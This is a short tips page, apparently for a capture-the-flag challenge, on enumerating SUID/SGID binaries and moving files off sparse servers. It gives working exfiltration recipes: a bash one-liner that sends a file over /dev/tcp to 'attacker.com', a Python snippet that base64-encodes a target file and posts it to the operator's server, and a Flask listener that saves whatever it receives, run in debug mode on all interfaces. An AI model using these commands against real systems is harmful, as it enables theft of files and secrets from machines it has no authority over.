# Tips

The servers generally don't have many useful binaries on them, which actually makes it easy to find stuff.

## Interesting files
* Python3 (limited libraries)
* Perl (limited libraries)
* find / -perm /4000
* find / -perm /2000
* find / -perm /6000
* /entrypoint.sh
* /usr/bin/runtoanswer

## File Transfer

File transfer can be carried out with [bash](https://gtfobins.github.io/gtfobins/bash/#file-upload) (most reliable thus far):

```bash
export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
bash -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'
```

File transfer can be carried out with [Python](https://gtfobins.github.io/gtfobins/python/#file-upload). I generally base64 things first to make it easier. This adds a name parameter:

```bash
export URL="http://[YOUR_SERVER]/"
export LFILE=/tmp/test.txt

base64 [target_file] > $LFILE
python3 -c 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read(), "name":e["LFILE"]).encode()))'
```

Then on the receiving end, [URL Decode and Base64 decode](https://gchq.github.io/CyberChef/#recipe=URL_Decode()From_Base64('A-Za-z0-9%2B/%3D',true,false)). Depending on how you receive the data (e.g. `netcat`), you might need to cut off the HTTP headers and parameters.

```python
import os
from flask import Flask, flash, request, redirect, url_for, make_response
from werkzeug.utils import secure_filename
from hashlib import md5
from time import time

UPLOAD_FOLDER = './'

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

def inc_counter():
    counter = counter + 1

@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        data = request.form.get('d')
        name = request.form.get('name')

        if data is None:
            return make_response("No data found in parameter d. Run curl --data \"d=[DATA]\" [url] to send data", 400)

        if name is None:
            name = "{}_{}.out".format(md5(data.encode()).hexdigest(), str(int(time())))

        name = os.path.basename(name)

        print("Saving file: " + name)

        with open(name, "wb") as f:
            f.write(data.encode())

        return "name: {n} saved".format(n=name, d=data)

    return '''
    <!doctype html>
    <title>Upload new File</title>
    <h1>Upload new File</h1>

POST a parameter 'd' with file info
    </form>
    '''

if __name__ == "__main__":
    import sys

    host = '0.0.0.0'
    port = 80

    if len(sys.argv) > 1:
        host = sys.argv[1]

    if len(sys.argv) > 2:
        port = sys.argv[2]

    app.run(debug=True, host=host, port=port)

```

Will do the job, minus base64